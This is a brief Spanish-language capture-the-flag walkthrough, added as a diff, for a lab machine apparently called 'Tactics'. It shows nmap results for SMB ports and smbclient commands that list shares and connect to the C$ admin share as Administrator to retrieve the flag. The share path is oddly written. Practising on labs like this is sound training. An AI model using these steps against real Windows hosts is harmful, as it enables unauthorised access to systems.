@@ -1,0 +1,22 @@
+Tactics Very easy
+
+bueno hacemos un nmap
+
+PORT    STATE SERVICE      REASON
+135/tcp open  msrpc        syn-ack ttl 127
+139/tcp open  netbios-ssn  syn-ack ttl 127
+445/tcp open  microsoft-ds syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
+           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (968B)
+
+tenemos un smb
+
+pues no tiene nada
+
+smbclient -L ip -U usuario
+
+smbclient ////ip//C$ -U Administrator
+
+y hacemos get a la flag
